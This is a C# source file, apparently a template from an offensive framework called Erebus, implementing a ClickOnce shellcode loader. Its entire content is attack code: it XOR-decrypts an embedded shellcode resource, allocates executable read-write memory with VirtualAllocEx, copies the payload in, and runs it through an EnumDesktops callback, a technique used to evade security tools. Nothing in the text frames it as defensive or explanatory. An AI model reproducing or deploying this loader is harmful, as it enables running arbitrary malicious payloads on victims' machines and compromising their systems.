using Erebus.ClickOnce;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;

namespace ShellcodeLoader
{
    public class ClickOnceLoader
    {
        [STAThread]
        [SupportedOSPlatform("windows")]
        public static void Main(string[] args)
        {
            byte[] key = { { { SHELLCODE_KEY } } };

            byte[] shellcode = ErebusRsrc.erebus_bin;

            if (key.Length > 0)
            {
                for (int i = 0; i < shellcode.Length; i++)
                    shellcode[i] = (byte)(shellcode[i] ^ key[i % key.Length]);
            }

            IntPtr base_address = Win32.VirtualAllocEx(Win32.GetCurrentProcess(), IntPtr.Zero, (uint)shellcode.Length,
                Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE, Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

            Marshal.Copy(shellcode, 0, base_address, shellcode.Length);

            Win32.EnumDesktops(IntPtr.Zero, base_address, IntPtr.Zero);
        }
    }
}
